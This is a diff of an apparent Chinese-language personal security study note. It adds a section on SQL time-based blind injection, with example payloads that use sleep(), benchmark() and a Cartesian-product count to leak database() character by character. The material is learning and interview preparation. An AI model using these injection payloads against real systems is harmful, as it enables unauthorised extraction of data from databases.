@@ -339,4 +339,36 @@ require_once 'pearcmd.php';
 ![600](assets/Day%202/file-20251218155630860.png)
 ![600](assets/Day%202/file-20251218155656294.png)
 
-# 0x04 (CVE-2024-2961)
+# 0x04 SQL时间盲注手法
+之前真的没有认真研究过时间盲注，觉得很麻烦，有没有遇到过，这次VN面试问到了才知道后悔。
+所以特意学习一下
+##  4.1 sleep()
+sleep(5),会停止5秒
+一般是
+```sql
+Select * from tables where id = 1 and if(substr(database(),1,1)='a',sleep(3),null);
+```
+如果`database()`的第一个字符是`a`，那么停3秒，否则不停顿。
+
+substr(a,b,c):从`a`中的第`b`个字符开始取`c个字符
+除此之外还有`substring`、`mid`，用法完全相同
+
+## 4.2 benchmarck() 
+benchmark(100000,sha(1)):计算`sha(1)`，10000000次，接近1秒了
+```sql
+Select *from tables where id=1 and if(substr(database(),1,1)='x',benchmark(10000000,sha(1)), null);
+```
+
+## 4.3 笛卡尔积
+count(\*):统计后面的表有多少行
+通过连接几张很大的表，这个过程要耗时，来时间盲注
+```sql
+Select *from sc where sno=95001 and if(substr(database(),1,1)='x',(SELECT count(*) FROM information_schema.columns A,information_schema.columns B), null);
+```
+
+
+这里是几个能用上的吧，还有几种感觉用不上，可以看文章：
+https://www.fujieace.com/penetration-test/blind-time-delay.html
+https://www.cnblogs.com/forforever/p/13019703.html
+
+# 0x05 
